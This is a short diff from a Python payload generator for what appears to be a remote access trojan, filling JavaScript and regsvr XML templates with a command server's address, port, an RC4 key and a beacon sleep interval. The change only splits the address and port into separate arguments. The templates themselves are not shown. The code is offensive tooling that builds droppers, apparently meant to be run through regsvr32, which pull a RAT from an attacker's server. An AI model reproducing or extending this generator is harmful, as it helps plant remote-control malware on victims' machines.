@@ -29,26 +29,26 @@ class Payload():
         pass
 
     @classmethod
-    def init(cls, server_addr):
+    def init(cls, server_addr,server_port):
         context = load_template_js('template/init.js')
         context = context.replace(
-            '~URL_RAT~', 'http://{}:{}/rat'.format(server_addr[0], server_addr[1]))
+            '~URL_RAT~', 'http://{}:{}/rat'.format(server_addr, server_port))
 
         return context.encode()
 
     @classmethod
-    def rat(cls, server_addr, rc4_key, sleep_time):
+    def rat(cls, server_addr,server_port, rc4_key, sleep_time):
         context = load_template_js('template/rat.js')
         context = context.replace(
-            '~URL_RUN~', 'http://{}:{}'.format(server_addr[0], server_addr[1]))
+            '~URL_RUN~', 'http://{}:{}'.format(server_addr, server_port))
         context = context.replace('~KEY~', rc4_key)
         context = context.replace('~SLEEP~', str(sleep_time))
 
         return context.encode()
 
     @classmethod
-    def regsvr(cls, server_addr):
-        init_js = cls.init(server_addr).decode()
+    def regsvr(cls, server_addr,server_port):
+        init_js = cls.init(server_addr, server_port).decode()
         context = load_template_js('template/regsvr.xml')
         context = context.replace('~JS_RAT~', init_js)
 
